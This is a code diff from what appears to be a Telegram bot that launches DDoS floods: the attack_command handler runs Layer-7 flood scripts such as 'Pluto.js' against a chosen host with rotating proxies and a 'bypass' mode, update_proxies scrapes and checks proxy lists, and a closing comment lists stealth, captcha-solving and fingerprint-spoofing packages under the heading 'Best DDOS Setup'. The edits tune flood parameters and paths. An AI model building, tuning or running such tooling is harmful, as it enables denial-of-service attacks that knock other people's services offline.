@@ -265,7 +265,7 @@ def attack_command(message):
         # Update the command and duration based on the selected method
         if method == 'PLUTO':
             os.chdir("L7")
-            command = ["node", "Pluto.js", host, "60", "200", "14", "proxy.txt", "bypass"]
+            command = ["node", "Pluto.js", host, "60", "64", "14", "proxy.txt", "bypass"]
             duration = 60
         if method == 'CYCLONIC':
             os.chdir("L7")
@@ -546,15 +546,15 @@ def invalid_command(message):
 def update_proxies():
     try:
         print("Updating proxies...")
-        os.chdir("AA")  # Change directory to the folder containing proxy.py
+        os.chdir("/workspaces/telegram/AA")  # Change directory to the folder containing proxy.py
         subprocess.run(["python", "proxy.py"])  # Assuming proxy.py is your script to update proxies
         os.chdir("..")  # Change back to the main directory
         time.sleep(30)  # Wait for 30 seconds
-        os.chdir("AA")
+        os.chdir("/workspaces/telegram/AA")
         subprocess.run(["python", "check.py", "needtocheck.txt"])  # Assuming check.py is your script to check proxies
         os.chdir("..")
         print("Check process completed.")  # Indicate when the check process is completed
-        proxy_file_path = os.path.join("AA", "proxy.txt")
+        proxy_file_path = os.path.join("/workspaces/telegram/AA", "proxy.txt")
         if os.path.exists(proxy_file_path):  # Check if proxy.txt file exists
             print("Proxy file found. Copying and replacing...")  # Indicate when copying and replacing begins
             shutil.copy(proxy_file_path, "/workspaces/telegram/L7/proxy.txt")  # Copy and replace proxy file
@@ -580,12 +580,18 @@ def start_bot():
 if __name__ == "__main__":
     # Create threads for bot and scheduler
     bot_thread = threading.Thread(target=start_bot)
-    scheduler_thread = threading.Thread(target=schedule_update)
+    #scheduler_thread = threading.Thread(target=schedule_update)
 
     # Start both threads
     bot_thread.start()
-    scheduler_thread.start()
+    #scheduler_thread.start()
 
     # Wait for both threads to finish
     bot_thread.join()
-    scheduler_thread.join()
+    #scheduler_thread.join()
+
+
+
+
+# npm i user-agents header-generator request fake-useragent randomstring colors axios cheerio gradient-string cloudscraper random-useragent crypto-random-string playwright-extra fingerprint-generator fingerprint-injector ua-parser-js http2 minimist socks puppeteer hcaptcha-solver puppeteer-extra puppeteer-extra-plugin-recaptcha puppeteer-extra-plugin-stealth http http2 zombie random-referer jar xmlhttprequest vm set-cookie-parser
+# Best DDOS Setup
